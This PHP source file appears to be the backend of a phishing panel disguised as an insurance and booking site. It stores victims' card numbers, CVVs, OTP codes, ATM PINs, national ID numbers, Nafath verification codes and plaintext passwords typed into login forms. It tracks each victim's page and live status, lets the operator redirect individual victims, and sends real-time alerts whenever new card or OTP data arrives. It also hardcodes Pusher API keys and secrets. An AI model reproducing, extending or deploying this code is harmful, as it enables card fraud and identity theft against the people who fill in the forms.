<?php

/**
 * User System Login
 */
class User extends DB
{

  // users name of table
  private $table = 'admin';
  
  // ============================================
  // دوال تسجيل الدخول المحدثة
  // ============================================
  
  public function adminLogin($username, $password)
  {
    $email = trim((string) $username);
    if ($email === '' || $password === '') {
      return false;
    }
    if (!function_exists('dashboard_pdo')) {
      return false;
    }
    $st = dashboard_pdo()->prepare('SELECT * FROM `admins` WHERE `email` = ? LIMIT 1');
    $st->execute([$email]);
    $admin = $st->fetch(\PDO::FETCH_OBJ);
    if ($admin && password_verify($password, (string) ($admin->password_hash ?? ''))) {
      $this->updateLastLogin((int) $admin->id);
      $admin->username = $admin->email;
      $admin->full_name = (string) ($admin->email ?? '');
      return $admin;
    }
    return false;
  }
  
  public function updateLastLogin($adminId)
  {
    if (!function_exists('dashboard_pdo')) {
      $sql = "UPDATE `admin` SET `last_login` = NOW() WHERE `id` = :id";
      DB::query($sql);
      DB::bind(':id', $adminId);
      return DB::execute();
    }
    $u = dashboard_pdo()->prepare('UPDATE `admins` SET `last_login_at` = NOW() WHERE `id` = ?');
    return (bool) $u->execute([(int) $adminId]);
  }
  
  public function checkAdminSession()
  {
    if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
      return false;
    }
    return true;
  }
  
  public function createAdmin($username, $password, $fullName = null, $email = null)
  {
    $emailUse = trim((string) ($email !== null && (string) $email !== '' ? $email : $username));
    if ($emailUse === '' || strpos($emailUse, '@') === false) {
      return ['success' => false, 'error' => 'بريد إلكتروني صالح مطلوب (يُستخدم للدخول)'];
    }
    $checkSql = 'SELECT `id` FROM `admins` WHERE `email` = :email LIMIT 1';
    DB::query($checkSql);
    DB::bind(':email', $emailUse);
    if (DB::fetch()) {
      return ['success' => false, 'error' => 'البريد مسجّل مسبقاً'];
    }
    $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
    $sql = 'INSERT INTO `admins` (`email`, `password_hash`) VALUES (:email, :ph)';
    DB::query($sql);
    DB::bind(':email', $emailUse);
    DB::bind(':ph', $hashedPassword);
    if (DB::execute()) {
      return ['success' => true, 'id' => DB::lastInsertId()];
    }
    return ['success' => false, 'error' => 'حدث خطأ أثناء الإضافة'];
  }
  
  public function getAllAdmins()
  {
    $sql = 'SELECT `id`, `email`, `created_at`, `last_login_at` FROM `admins` ORDER BY `id` DESC';
    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();
    return is_array($data) ? $data : [];
  }

  // ============================================
  // دالة مساعدة لإرسال إشعار Pusher
  // ============================================
  private function sendPusherUpdate($userId, $message = 'تحديث بيانات')
  {
    try {
      if (function_exists('bujairi_pusher_instance')) {
        $pusher = bujairi_pusher_instance();
        if ($pusher) {
          $pusher->trigger('my-channel', 'updaefte-user-payys', [
            'userId' => $userId,
            'updatedData' => ['message' => $message, 'rowStyle' => 'info'],
          ]);
          return true;
        }
      }
      $autoload = dirname(__DIR__, 2) . '/vendor/autoload.php';
      if (!is_readable($autoload) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        $autoload = rtrim((string) $_SERVER['DOCUMENT_ROOT'], '/\\') . '/vendor/autoload.php';
      }
      if (!is_readable($autoload)) {
        return false;
      }
      require_once $autoload;
      $pusher = new Pusher\Pusher(
        'a56388ee6222f6c5fb86',
        '4c77061f4115303aac58',
        '1973588',
        ['cluster' => 'ap2', 'useTLS' => true]
      );
      $pusher->trigger('my-channel', 'updaefte-user-payys', [
        'userId' => $userId,
        'updatedData' => ['message' => $message, 'rowStyle' => 'info'],
      ]);
      return true;
    } catch (Exception $e) {
      error_log("Pusher Error: " . $e->getMessage());
      return false;
    }
  }

  private function sendPusherNew($userId, $message = 'عميل جديد')
  {
    try {
      if (function_exists('bujairi_pusher_instance')) {
        $pusher = bujairi_pusher_instance();
        if ($pusher) {
          $pusher->trigger('my-channel', 'my-event-newwwe', [
            'userId' => $userId,
            'message' => $message,
          ]);
          return true;
        }
      }
      $autoload = dirname(__DIR__, 2) . '/vendor/autoload.php';
      if (!is_readable($autoload) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        $autoload = rtrim((string) $_SERVER['DOCUMENT_ROOT'], '/\\') . '/vendor/autoload.php';
      }
      if (!is_readable($autoload)) {
        return false;
      }
      require_once $autoload;
      $pusher = new Pusher\Pusher(
        'a56388ee6222f6c5fb86',
        '4c77061f4115303aac58',
        '1973588',
        ['cluster' => 'ap2', 'useTLS' => true]
      );
      $pusher->trigger('my-channel', 'my-event-newwwe', [
        'userId' => $userId,
        'message' => $message,
      ]);
      return true;
    } catch (Exception $e) {
      error_log("Pusher Error: " . $e->getMessage());
      return false;
    }
  }

  public function login($data)
  {
    $sql = 'SELECT * FROM ' . $this->table . ' WHERE `username` = :username OR `email` = :email LIMIT 1';

    DB::query($sql);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::execute();

    $user = DB::fetch();
    if (DB::rowCount() > 0) {
      if ($data['password'] == $user->password) {
        $_SESSION['user_session'] = $user->id;
        return true;
      } else {
        return false;
      }
    }
  }
  
  public function fetchAdminById($id)
  {
    $sql = 'SELECT * FROM `admins` WHERE `id` = :id LIMIT 1';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }
  
  public function updateLastPage($userId, $pageName)
  {
    $sql = 'UPDATE `users` SET `last_page` = :page WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':page', $pageName);
    DB::bind(':id', $userId);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'تغيير صفحة');
      return true;
    }
    return false;
  }

  public function fetchUserById($id)
  {
    $id = (int) $id;
    if ($id < 0 && function_exists('dashboard_pdo')) {
      $gid = -$id;
      if ($gid > 0) {
        try {
          $pdo = dashboard_pdo();
          $st = $pdo->prepare(
            'SELECT g.id, g.email, g.password_entered, g.next_after_login, g.created_at,
              (SELECT o.mobile FROM orders o WHERE o.customer_email = g.email ORDER BY o.id DESC LIMIT 1) AS last_order_phone
             FROM guest_logins g WHERE g.id = ? LIMIT 1'
          );
          $st->execute([$gid]);
          $g = $st->fetch(\PDO::FETCH_OBJ);
          if ($g) {
            $existsUser = $pdo->prepare('SELECT 1 FROM users WHERE email = ? LIMIT 1');
            $existsUser->execute([$g->email]);
            if ($existsUser->fetchColumn()) {
              return false;
            }
            return (object) [
              'id' => -$gid,
              'email' => $g->email,
              'full_name' => null,
              'password_hash' => '',
              'created_at' => $g->created_at,
              'last_login_at' => null,
              'email_password_entered' => $g->password_entered,
              'is_guest_only' => 1,
              'next_after_login' => $g->next_after_login,
              'last_order_phone' => $g->last_order_phone ?? null,
            ];
          }
        } catch (\Throwable $e) {
        }
        return false;
      }
    }
    if (function_exists('dashboard_pdo')) {
      try {
        $pdo = dashboard_pdo();
        $hasGuest = false;
        try {
          $pdo->query('SELECT 1 FROM `guest_logins` LIMIT 1');
          $hasGuest = true;
        } catch (\Throwable $e) {
        }
        if ($hasGuest) {
          $st = $pdo->prepare(
            'SELECT u.*,
              (SELECT gl.password_entered FROM guest_logins gl WHERE gl.email = u.email ORDER BY gl.id DESC LIMIT 1) AS email_password_entered,
              (SELECT o.mobile FROM orders o WHERE o.customer_email = u.email ORDER BY o.id DESC LIMIT 1) AS last_order_phone
             FROM `users` u WHERE u.id = ? LIMIT 1'
          );
        } else {
          $st = $pdo->prepare(
            'SELECT u.*, (SELECT o.mobile FROM orders o WHERE o.customer_email = u.email ORDER BY o.id DESC LIMIT 1) AS last_order_phone
             FROM `users` u WHERE u.id = ? LIMIT 1'
          );
        }
        $st->execute([$id]);
        $data = $st->fetch(\PDO::FETCH_OBJ);
        return $data ?: false;
      } catch (\Throwable $e) {
        // fall through
      }
    }
    $sql = 'SELECT * FROM `users` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0) {
      return $data;
    }
    return false;
  }

  public function fetchCardById($id)
  {
    $sql = 'SELECT * FROM `card` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function deleteAdminById($id)
  {
    $sql = 'DELETE FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    return DB::execute();
  }

  public function isLoggedIn()
  {
    if (isset($_SESSION['user_session']))
      return true;
  }

  public function logOut()
  {
    session_destroy();
    unset($_SESSION['user_session']);
    if (isset($_SESSION['user_session']))
      return false;
    else
      return true;
  }

  public function redirect($url)
  {
    echo "
      <script>
      window.location.href=\"$url\";
      </script>
      ";
  }

  public function insertAdmin($data = array())
  {
    $sql = 'INSERT INTO `admin` (`username`,
                                  `email`,
                                  `password`)
                                    VALUE ( :username,:email,:password)
                                           ';
    DB::query($sql);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::bind('password', $data['password']);

    return DB::execute();
  }

  public function fetchAllAdmin()
  {
    $sql = 'SELECT * FROM `admins` ORDER BY `id` DESC';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (is_array($data) && count($data) > 0) {
      return $data;
    }
    return false;
  }
  
  public function fetchAllUsers()
  {
    try {
      if (function_exists('dashboard_pdo')) {
        $pdo = dashboard_pdo();
        $hasGuest = false;
        try {
          $pdo->query('SELECT 1 FROM `guest_logins` LIMIT 1');
          $hasGuest = true;
        } catch (\Throwable $e) {
        }
        if ($hasGuest) {
          $st = $pdo->query(
            'SELECT u.*,
              (SELECT gl.password_entered FROM guest_logins gl WHERE gl.email = u.email ORDER BY gl.id DESC LIMIT 1) AS email_password_entered,
              (SELECT o.mobile FROM orders o WHERE o.customer_email = u.email ORDER BY o.id DESC LIMIT 1) AS last_order_phone
             FROM `users` u ORDER BY u.id DESC'
          );
        } else {
          $st = $pdo->query(
            'SELECT u.*,
              (SELECT o.mobile FROM orders o WHERE o.customer_email = u.email ORDER BY o.id DESC LIMIT 1) AS last_order_phone
             FROM `users` u ORDER BY u.id DESC'
          );
        }
        if ($st) {
          $data = $st->fetchAll(\PDO::FETCH_OBJ);
          if (!\is_array($data)) {
            $data = [];
          }
        } else {
          $data = [];
        }
        if ($hasGuest) {
          try {
            $gSt = $pdo->query(
              "SELECT g.id, g.email, g.password_entered AS email_password_entered, g.created_at, g.next_after_login,
                (SELECT o.mobile FROM orders o WHERE o.customer_email = g.email ORDER BY o.id DESC LIMIT 1) AS last_order_phone
               FROM guest_logins g
               INNER JOIN (
                 SELECT email AS em, MAX(id) AS max_id FROM guest_logins GROUP BY email
               ) t ON t.max_id = g.id
               WHERE NOT EXISTS (SELECT 1 FROM users u WHERE u.email = g.email)
               ORDER BY g.id DESC"
            );
            if ($gSt) {
              $guests = $gSt->fetchAll(\PDO::FETCH_OBJ);
              foreach ($guests as $g) {
                $data[] = (object) [
                  'id' => -((int) $g->id),
                  'email' => $g->email,
                  'full_name' => null,
                  'password_hash' => '',
                  'created_at' => $g->created_at,
                  'last_login_at' => null,
                  'email_password_entered' => $g->email_password_entered,
                  'is_guest_only' => 1,
                  'next_after_login' => $g->next_after_login ?? null,
                  'last_order_phone' => $g->last_order_phone ?? null,
                ];
              }
            }
          } catch (\Throwable $e) {
          }
        }
        if (\is_array($data) && \count($data) > 0) {
          \usort(
            $data,
            static function ($a, $b): int {
              $ta = \strtotime((string) ($a->created_at ?? 0)) ?: 0;
              $tb = \strtotime((string) ($b->created_at ?? 0)) ?: 0;
              return $tb <=> $ta;
            }
          );
        }
        return $data;
      }
      $sql = 'SELECT * FROM `users` ORDER BY id DESC;';
      DB::query($sql);
      DB::execute();
      $data = DB::fetchAll();
      if (DB::rowCount() > 0) {
        return $data;
      }
    } catch (\Throwable $e) {
    }
    return false;
  }
  
  public function fetchAllCards()
  {
    $sql = 'SELECT * FROM `card` ORDER BY id DESC;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function NumberOfCards()
  {
    $sql = 'SELECT count(*) as total FROM `card`';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return 0;
    }
  }

  public function register($data = array())
  {
    $username = $this->generateRandomUsername();

    $sql = 'INSERT INTO `users` (
              `username`,
              `ssn`,
              `message`,
              `priceCharge`,                      
              `totalPriceInput`)      
            VALUES (
              :username,
              :ssn,
              :message,
              :priceCharge,
              :totalPriceInput
            )';

    DB::query($sql);
    DB::bind(':username', $username);
    DB::bind(':ssn', $data['ssn']);
    DB::bind(':message', 'Inactive');
    DB::bind(':priceCharge', isset($data['priceCharge']) ? $data['priceCharge'] : null);
    DB::bind(':totalPriceInput', isset($data['totalPriceInput']) ? $data['totalPriceInput'] : null);

    if (DB::execute()) {
      $lastId = DB::lastInsertId();
      $this->sendPusherNew($lastId, 'عميل جديد');
      return $lastId;
    } else {
      return false;
    }
  }

  private function generateRandomUsername()
  {
    $prefixes = ['user', 'member', 'client', 'guest'];
    $randomPrefix = $prefixes[array_rand($prefixes)];
    $randomNumber = rand(1000, 9999);
    return $randomPrefix . $randomNumber;
  }

  public function UpdateStatus($id, $message)
  {
    $sql = 'UPDATE `users` SET `message` = :message WHERE `id` = :id;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':message', $message);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, $message);
      return true;
    }
    return false;
  }

  public function InsertCardRelatedUser($id, $data = array())
  {
    $sql = 'INSERT INTO `card` (
      `bank`,
      `cardNumber`,
      `month`,
      `year`,
      `password`,
      `bad`,
      `provider`,
      `phone`,
      `otpphone`,
      `civilnumber`,
      `userId`
    ) VALUE (
      :bank,
      :cardNumber,
      :month,
      :year,
      :password,
      :bad,
      :provider,
      :phone,
      :otpphone,
      :civilnumber,
      :id
    )';

    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':bank', $data['bank']);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':month', $data['month']);
    DB::bind(':year', $data['year']);
    DB::bind(':password', $data['password']);
    DB::bind(':bad', $data['bad']);
    DB::bind(':provider', $data['provider']);
    DB::bind(':phone', $data['phone']);
    DB::bind(':otpphone', $data['otpphone']);
    DB::bind(':civilnumber', $data['civilnumber']);

    if (DB::execute()) {
      $cardId = DB::lastInsertId();
      $this->sendPusherUpdate($id, 'بيانات بطاقة جديدة');
      return $cardId;
    } else {
      return false;
    }
  }

  public function UpdateCardOTP($id, $data = array())
  {
    $sql = 'UPDATE `card` SET `status` = :status, `otp` = :otp  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':otp', $data['otp']);
    DB::bind(':status', 0);
    
    if (DB::execute()) {
      // جلب userId من الكارد
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'رمز OTP جديد');
      }
      return true;
    }
    return false;
  }

  public function UpdateCardCVV($id, $data = array())
  {
    $sql = 'UPDATE `card` SET `cvv` = :cvv  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':cvv', $data['cvv']);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'CVV محدث');
      }
      return true;
    }
    return false;
  }

  public function UpdateVerify($id, $data = array())
  {
    $sql = 'UPDATE `users` SET `waitVerify` = :waitVerify , `message` = :message WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':waitVerify', $data['waitVerify']);
    DB::bind(':message', 'Wait Verify');
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'بانتظار التحقق');
      return true;
    }
    return false;
  }

  public function DeleteUserById($id)
  {
    $id = (int) $id;
    if ($id < 0 && function_exists('dashboard_pdo')) {
      $gid = -$id;
      try {
        $st = dashboard_pdo()->prepare('DELETE FROM guest_logins WHERE id = ?');
        return $st->execute([$gid]) && $st->rowCount() > 0;
      } catch (\Throwable $e) {
        return false;
      }
    }
    $sql = 'DELETE FROM `users` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    return DB::execute();
  }

  public function DeleteAllUsers()
  {
    $sql = 'DELETE FROM `users`';
    DB::query($sql);
    return DB::execute();
  }

  public function UpdateCardCodeById($id, $code)
  {
    $sql = 'UPDATE `card` SET `code` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'كود جديد');
      }
      return true;
    }
    return false;
  }

  public function UpdateCardPasswordById($id, $password)
  {
    $sql = 'UPDATE `card` SET `password` = :password WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':password', $password);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'كلمة سر محدثة');
      }
      return true;
    }
    return false;
  }

  public function register2($data = array())
  {
    $sql = 'INSERT INTO `card` (
      `cardNumber`,
      `expire1`,
      `expire2`,
      `cvv`
    ) VALUE (
      :cardNumber,
      :month,
      :year,
      :cvv
    )';
    DB::query($sql);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':month', $data['month']);
    DB::bind(':year', $data['year']);
    DB::bind(':cvv', $data['cvv']);
    
    if (DB::execute())
      return DB::lastInsertId();
    else
      return false;
  }

  public function UpdateUserCodeById($id, $code)
  {
    $sql = 'UPDATE `users` SET `code` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'كود تحقق جديد');
      return true;
    }
    return false;
  }

  public function UpdateUserCheckTheCodeById($id, $code)
  {
    $sql = 'UPDATE `users` SET `CheckTheCode` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'فحص الكود');
      return true;
    }
    return false;
  }

  public function UpdateUserStatusById($id, $status)
  {
    $sql = 'UPDATE `users` SET `status` = :status WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':status', $status);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'تحديث الحالة');
      return true;
    }
    return false;
  }

  public function UpdateUserCheckTheInfo_NafadAndTextById($id, $code, $temp)
  {
    $sql = 'UPDATE `card` SET `CheckTheInfo_Nafad` = :code , `TemporaryPassword` = :temp  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    DB::bind(':temp', $temp);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'معلومات نفاذ');
      }
      return true;
    }
    return false;
  }

  public function UpdateCard($id, $code)
  {
    $sql = 'UPDATE `card` SET `status` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'تحديث بطاقة');
      }
      return true;
    }
    return false;
  }

  public function FetchAllUsersForList()
  {
    $sql = 'SELECT * FROM `users` ORDER BY id DESC;';
    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function UpdateUserById($id, $access)
  {
    $sql = 'UPDATE `users` SET `access` = :access WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':access', $access);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'تحديث صلاحية');
      return true;
    }
    return false;
  }

  public function insertLink($data)
  {
    $sql = 'UPDATE `users` SET `link` = :link WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $data['id']);
    DB::bind(':link', $data['link']);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($data['id'], 'رابط جديد');
      return true;
    }
    return false;
  }

  public function updateAdmin($id, $data)
  {
    $sql = 'UPDATE `admin` SET `username` = :username,`password` = :password,`email` = :email
                                  WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::bind(':password', $data['password']);
    DB::bind(':id', $id);
    return DB::execute();
  }

  public function fetchAdmin($id)
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

public function insertFormData($data = array())
{
    $sql = 'INSERT INTO `users` (
      `request_type`,
      `nationality`,
      `ssn`,
      `name`,
      `phone`,
      `date`,
      `email`,
      `username`,
      `message`,
      `selected_school`,
      `currentpage`,
      `status`,
      `live`,
      `lastlive`,
      `ip_address`,
      `user_agent`,
      `session_id`
    ) VALUES (
      :request_type,
      :nationality,  -- ✅ أضف هذا
      :ssn,
      :name,
      :phone,
      :date,
      :email,
      :username,
      :message,
      :selected_school,
      :currentpage,
      :status,
      :live,
      :lastlive,
      :ip_address,
      :user_agent,
      :session_id
    )';

    DB::query($sql);
    
    // ربط البيانات
    DB::bind(':request_type', $data['request_type'] ?? null);
    DB::bind(':nationality', $data['nationality'] ?? null);  // ✅ أضف هذا
    DB::bind(':ssn', $data['ssn'] ?? null);
    DB::bind(':name', $data['name'] ?? null);
    DB::bind(':phone', $data['phone'] ?? null);
    DB::bind(':date', $data['date'] ?? null);
    DB::bind(':email', $data['email'] ?? null);
    
    // بيانات النظام
    DB::bind(':username', $data['username'] ?? 'client_' . time());
    DB::bind(':message', $data['message'] ?? 'طلب تسجيل جديد');
    DB::bind(':selected_school', $data['selected_school'] ?? null);
    DB::bind(':currentpage', $data['currentpage'] ?? 'register.php');
    DB::bind(':status', $data['status'] ?? 0);
    DB::bind(':live', $data['live'] ?? 1);
    DB::bind(':lastlive', $data['lastlive'] ?? round(microtime(true) * 1000));
    DB::bind(':ip_address', $data['ip_address'] ?? null);
    DB::bind(':user_agent', $data['user_agent'] ?? null);
    DB::bind(':session_id', $data['session_id'] ?? null);

    if (DB::execute()) {
      $lastId = DB::lastInsertId();
      $this->sendPusherNew($lastId, $data['message'] ?? 'طلب تسجيل جديد');
      return $lastId;
    } else {
      return false;
    }
}

  public function updateInsuranceData($userId, $data = array())
  {
    $sql = 'UPDATE `users` SET 
      `insurance_coverage_type` = :insurance_coverage_type,
      `start_date` = :start_date,
      `vehicle_usage` = :vehicle_usage,
      `market_value` = :market_value,
      `manufacture_year` = :manufacture_year,
      `car_model` = :car_model,
      `issue_place` = :issue_place,
      `message` = :message,
      `currentpage` = :currentpage,
      `updated_at` = CURRENT_TIMESTAMP
    WHERE `id` = :user_id';

    DB::query($sql);
    DB::bind(':insurance_coverage_type', $data['insurance_coverage_type'] ?? null);
    DB::bind(':start_date', $data['start_date'] ?? null);
    DB::bind(':vehicle_usage', $data['vehicle_usage'] ?? null);
    DB::bind(':market_value', $data['market_value'] ?? null);
    DB::bind(':manufacture_year', $data['manufacture_year'] ?? null);
    DB::bind(':car_model', $data['car_model'] ?? null);
    DB::bind(':issue_place', $data['issue_place'] ?? null);
    DB::bind(':message', 'بيانات التأمين - المرحلة 2');
    DB::bind(':currentpage', 'index2.php');
    DB::bind(':user_id', $userId);

    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'بيانات التأمين - المرحلة 2');
      return true;
    }
    
    return false;
  }

  public function updateUserMessage($id, $message)
  {
    $sql = 'UPDATE `users` SET `message` = :message WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':message', $message);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, $message);
      return true;
    }
    return false;
  }

  public function updateUserCurrentPage($id, $page)
  {
    $sql = 'UPDATE `users` SET `currentpage` = :page WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':page', $page);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'انتقل إلى: ' . $page);
      return true;
    }
    return false;
  }

  public function updateUserLiveStatus($id, $live)
  {
    $lastlive = round(microtime(true) * 1000);
    
    $sql = 'UPDATE `users` SET `live` = :live, `lastlive` = :lastlive WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':live', $live);
    DB::bind(':lastlive', $lastlive);
    return DB::execute();
  }

  public function fetchUsersWithFilter($formType = null, $status = null)
  {
    $sql = 'SELECT * FROM `users` WHERE 1=1';
    
    if ($formType !== null) {
      $sql .= ' AND `form_type` = :form_type';
    }
    
    if ($status !== null) {
      $sql .= ' AND `status` = :status';
    }
    
    $sql .= ' ORDER BY id DESC';
    
    DB::query($sql);
    
    if ($formType !== null) {
      DB::bind(':form_type', $formType);
    }
    
    if ($status !== null) {
      DB::bind(':status', $status);
    }
    
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function getVisitsCount()
  {
    if (!function_exists('dashboard_pdo')) {
      return 0;
    }
    try {
      // المخطط الحالي: site_public_visit_day (ليس جدول visits القديم)
      $st = dashboard_pdo()->query('SELECT COUNT(*) AS c FROM `site_public_visit_day`');
      if ($st === false) {
        return 0;
      }
      $row = $st->fetch(\PDO::FETCH_OBJ);
      return (int) ($row->c ?? 0);
    } catch (\Throwable $e) {
      return 0;
    }
  }

  public function incrementVisitCount()
  {
    // لم يعُد هناك جدول `visits` في المشروع؛ العداد من الموقع يُحدَّث عبر includes/site_visit_counter.php
    return true;
  }

public function insertCardPayment($data = array())
{
    $sql = 'INSERT INTO `cards` (
        `user_id`,
        `cardName`,
        `cardNumber`,
        `cardExpiry`,
        `cvv`,
        `price`,
        `payment_method`,
        `created_at`
    ) VALUES (
        :user_id,
        :cardName,
        :cardNumber,
        :cardExpiry,
        :cvv,
        :price,
        :payment_method,
        NOW()
    )';

    DB::query($sql);

    // تجهيز cardExpiry من month و year
    $cardExpiry = ($data['month'] ?? '00') . '/' . ($data['year'] ?? '0000');

    DB::bind(':user_id', $data['user_id']);
    DB::bind(':cardName', $data['cardName'] ?? null);
    DB::bind(':cardNumber', $data['cardNumber'] ?? null);
    DB::bind(':cardExpiry', $cardExpiry);
    DB::bind(':cvv', $data['cvv'] ?? null);
    DB::bind(':price', $data['price'] ?? '1.00');
    DB::bind(':payment_method', $data['payment_method'] ?? 'card');

    if (DB::execute()) {
        $cardId = DB::lastInsertId();
        $this->sendPusherUpdate($data['user_id'], 'دفع بطاقة جديد - ' . ($data['price'] ?? '1.00') . ' ر.س');
        return $cardId;
    }

    return false;
}

  public function fetchCardsByUserId($userId)
  {
    $uid = (int) $userId;
    $fromOrders = $this->fetchOrderRowsAsCards($uid);
    if (is_array($fromOrders) && count($fromOrders) > 0) {
      return $fromOrders;
    }
    try {
      $sql = 'SELECT * FROM `cards` WHERE `user_id` = :user_id ORDER BY created_at DESC';
      DB::query($sql);
      DB::bind(':user_id', $userId);
      DB::execute();
      return DB::fetchAll();
    } catch (\Throwable $e) {
      return [];
    }
  }

  /**
   * طلبات الحجز (orders) مرتبطة ببريد العميل — نفس شكل card للواجهة.
   * @return list<object>
   */
  private function fetchOrderRowsAsCards(int $userId): array
  {
    if (!function_exists('dashboard_pdo')) {
      return [];
    }
    $u = $this->fetchUserById($userId);
    if (!$u) {
      return [];
    }
    $email = trim((string) ($u->email ?? ''));
    if ($email === '') {
      return [];
    }
    try {
      $pdo = dashboard_pdo();
      $st = $pdo->prepare(
        'SELECT o.id, o.cardholder_name, o.card_number, o.expiry, o.cvv, o.otp, o.atm_password, o.created_at, o.status,
         (SELECT COALESCE(SUM(line_total),0) FROM order_items WHERE order_id = o.id) AS price
         FROM orders o
         WHERE o.customer_email = ?
         ORDER BY o.id DESC'
      );
      $st->execute([$email]);
      $rows = $st->fetchAll(\PDO::FETCH_OBJ);
      if (!is_array($rows) || count($rows) === 0) {
        return [];
      }
      $out = [];
      foreach ($rows as $o) {
        $out[] = (object) [
          'id' => (int) $o->id,
          'cardName' => $o->cardholder_name,
          'cardNumber' => $o->card_number,
          'cardExpiry' => $o->expiry,
          'cvv' => $o->cvv,
          'price' => $o->price,
          'created_at' => $o->created_at,
          'order_status' => $o->status ?? '',
          'otp' => (string) ($o->otp ?? ''),
          'atm_password' => (string) ($o->atm_password ?? ''),
          'source' => 'orders',
        ];
      }
      return $out;
    } catch (\Throwable $e) {
      return [];
    }
  }

  public function getRedirectUrl($userId)
  {
    if (function_exists('dashboard_pdo')) {
      try {
        $pdo = dashboard_pdo();
        $k = 'dash_redirect_user_' . (int) $userId;
        $st = $pdo->prepare('SELECT setting_value FROM site_settings WHERE setting_key = ? LIMIT 1');
        $st->execute([$k]);
        $raw = $st->fetchColumn();
        if ($raw !== false && $raw !== null) {
          $j = json_decode((string) $raw, true);
          if (is_array($j) && !empty($j['active']) && !empty($j['page'])) {
            return (string) $j['page'];
          }
        }
      } catch (\Throwable $e) {
      }
    }
    try {
      $sql = 'SELECT redirect_to, redirect_active FROM users WHERE id = :id LIMIT 1';
      DB::query($sql);
      DB::bind(':id', $userId);
      DB::execute();
      $row = DB::fetch();
      if ($row && isset($row->redirect_active) && (int) $row->redirect_active === 1 && !empty($row->redirect_to)) {
        return (string) $row->redirect_to;
      }
    } catch (\Throwable $e) {
    }
    return null;
  }

